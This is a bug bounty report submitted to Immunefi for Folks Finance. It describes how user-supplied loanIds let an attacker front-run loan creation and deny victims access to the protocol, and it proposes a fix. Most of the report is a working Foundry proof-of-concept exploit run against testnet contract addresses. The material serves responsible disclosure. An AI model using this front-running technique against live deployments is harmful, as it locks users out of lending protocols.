# Boost \_ Folks Finance 33778 - \[Smart Contract - Medium] The loan creation process can be griefed

Submitted on Mon Jul 29 2024 08:48:29 GMT-0400 (Atlantic Standard Time) by @JCN2023 for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #33778

Report type: Smart Contract

Report severity: Medium

Target: <https://testnet.snowtrace.io/address/0x6628cE08b54e9C8358bE94f716D93AdDcca45b00>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

A loan is required in order to perform core operations (depositing, borrowing) in the folks finance protocol. It is the user's responsibility to supply an arbitrary `loanId` during the `createLoan` function call. A bad actor can front-run any loan creation operation seen on the Hub chain and create a loan using the `loanId` seen in any user's tx. Therefore, the bad actor is able to grief the loan creation of any other user, preventing them from being able to interact with the core operations of the protocol for an arbitrary amount of time.

## Bug Description

Ignoring cross-chain components, the execution flow for loan creation is as follows: `SpokeCommon::createLoan -> router/adapter/hub interactions -> LoanManager::createUserLoan`. It is important to note that all the loan state is stored on the Hub chain, so the `LoanManager` contract on the Hub chain will store the loan information for all users, even if the user is interacting via a different Spoke chain.

When creating a loan, a user must supply a `loanId` that will be the identifier for the loan to be created:

[SpokeCommon::createLoan](https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/spoke/SpokeCommon.sol#L115-L122)

```solidity
115:    function createLoan(
116:        Messages.MessageParams memory params,
117:        bytes32 accountId,
118:        bytes32 loanId, // @audit: user defined
119:        uint16 loanTypeId,
120:        bytes32 loanName
121:    ) external payable nonReentrant {
122:        _doOperation(params, Messages.Action.CreateLoan, accountId, abi.encodePacked(loanId, loanTypeId, loanName));
```

The `loanId` is then validated to be inactive, i.e. no other user should have used this `loanId` yet.

[LoanManager::createUserLoan](https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/hub/LoanManager.sol#L40-L53)

```solidity
40:    function createUserLoan(
41:        bytes32 loanId,
42:        bytes32 accountId,
43:        uint16 loanTypeId,
44:        bytes32 loanName
45:    ) external override onlyRole(HUB_ROLE) nonReentrant {
46:        // check loan types exists, is not deprecated and no existing user loan for same loan id
47:        if (!isLoanTypeCreated(loanTypeId)) revert LoanTypeUnknown(loanTypeId);
48:        if (isLoanTypeDeprecated(loanTypeId)) revert LoanTypeDeprecated(loanTypeId);
49:        if (isUserLoanActive(loanId)) revert UserLoanAlreadyCreated(loanId); // @audit: revert if loanId already used to create active loan
50:
51:        // create loan
52:        UserLoan storage userLoan = _userLoans[loanId];
53:        userLoan.isActive = true;
```

[LoanManagerState::isUserLoanActive](https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/hub/LoanManagerState.sol#L413-L414)

```solidity
413:    function isUserLoanActive(bytes32 loanId) public view returns (bool) {
414:        return _userLoans[loanId].isActive;
```

Since this `loanId` value is user defined, any bad actor can front-run other users' `createLoan` transactions and create loans using those users' `loanId`s. This will result in the users' transactions reverting on line 49 in `LoanManager.sol`.

## Impact

A bad actor can consistently grief other users' `createLoan` transactions, preventing those users from interacting with the core components of the protocol for an arbitrary amount of time. The bad actor can lower the gas costs of this exploit by submitting their `createLoan` tx directly via the Hub chain (utilizing the `HubAdapter`) instead of interacting via a Spoke chain (triggering cross chain communications).

## Recommended Mitigation

I would recommend implementing an `loanId` state variable that is utilized and incremented every time a new loan is created. This would be more gas intensive, but would limit the number of arbitrary values that users can supply to functions, which will in turn decrease the number of possible attack vectors.

## Proof of concept

## Proof of Concept

To run foundry POC:

* add test file to `test/` directory of a foundry repo
* add `AVAX_FUJI_RPC_URL` variable as environment var or in `.env` file
* run test with `forge test --mc FolksPOC_GriefLoanCreation`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

interface IHUB {
    function loanManager() external view returns (address);
}

interface ISpoke {
    struct MessageParams {
        uint16 adapterId; 
        uint16 returnAdapterId; 
        uint256 receiverValue; 
        uint256 gasLimit; 
        uint256 returnGasLimit; 
    }

    function createAccount(MessageParams memory params, bytes32 accountId, bytes32 refAccountId) external payable;
    function createLoan(MessageParams memory params, bytes32 accountId, bytes32 loanId, uint16 loanTypeId, bytes32 loanName) external payable;
}

interface ILoanManager {
    function isUserLoanActive(bytes32 loanId) external view returns (bool);
}

interface IHubAdapter {
    function sequence() external view returns (uint256);
}

contract FolksPOC_GriefLoanCreation is Test {
    uint256 avaxTestnetFork;

    string AVAX_FUJI_RPC_URL = vm.envString("AVAX_FUJI_RPC_URL");

    address constant HUB = 0xaE4C62510F4d930a5C8796dbfB8C4Bc7b9B62140;

    address constant HUB_ADAPTER = 0xf472ab58969709De9FfEFaeFFd24F9e90cf8DbF9;

    address constant SPOKE_COMMON = 0x6628cE08b54e9C8358bE94f716D93AdDcca45b00;

    event MessageFailed(uint16 adapterId, bytes32 indexed messageId, bytes reason);

    error UserLoanAlreadyCreated(bytes32 loanId);

    function setUp() public {
        avaxTestnetFork = vm.createFork(AVAX_FUJI_RPC_URL);

        vm.selectFork(avaxTestnetFork);
    }

    function testGriefLoanCreation() public {
        // user address
        address user = address(0x1234);

        // bad actor address
        address badActor = address(0x69420);

        // bad actor has account created
        ISpoke.MessageParams memory params = ISpoke.MessageParams({ 
            adapterId: 1,
            returnAdapterId: 1,
            receiverValue: 0,
            gasLimit: 0,
            returnGasLimit: 0
        });

        bytes32 badActorAccountId = keccak256(abi.encodePacked(badActor));
        vm.prank(badActor);
        ISpoke(SPOKE_COMMON).createAccount(params, badActorAccountId, bytes32(0));

        // user creates account
        bytes32 userAccountId = keccak256(abi.encodePacked(user));
        vm.prank(user);
        ISpoke(SPOKE_COMMON).createAccount(params, userAccountId, bytes32(0));

        // user pre-computes their loanId
        bytes32 userLoanId = keccak256(abi.encodePacked(user, userAccountId));

        // user's pre-computed loanId is not active yet
        address loanManager = IHUB(HUB).loanManager();
        bool active = ILoanManager(loanManager).isUserLoanActive(userLoanId);
        assertTrue(!active);

        // bad actor sees user's tx on Hub (part of cross-chain tx or directly on Hub chain) and front-runs tx using user's loanId
        vm.prank(badActor);
        ISpoke(SPOKE_COMMON).createLoan(params, badActorAccountId, userLoanId, uint16(2), bytes32(0));

        // user's pre-computed loanId has been created by the bad actor first
        active = ILoanManager(loanManager).isUserLoanActive(userLoanId);
        assertTrue(active);

        // user's loan creation fails since loanId is now active
        bytes32 messageId = keccak256(abi.encodePacked(bytes32("HUB_ADAPTER_V1"), IHubAdapter(HUB_ADAPTER).sequence()));
        bytes memory reason = abi.encodeWithSelector(UserLoanAlreadyCreated.selector, userLoanId); // error message from failed operation

        vm.startPrank(user);
        vm.expectEmit(true, false, false, true);
        emit MessageFailed(params.adapterId, messageId, reason); 
        ISpoke(SPOKE_COMMON).createLoan(params, userAccountId, userLoanId, uint16(2), bytes32(0)); 
        vm.stopPrank();
    }
}
```
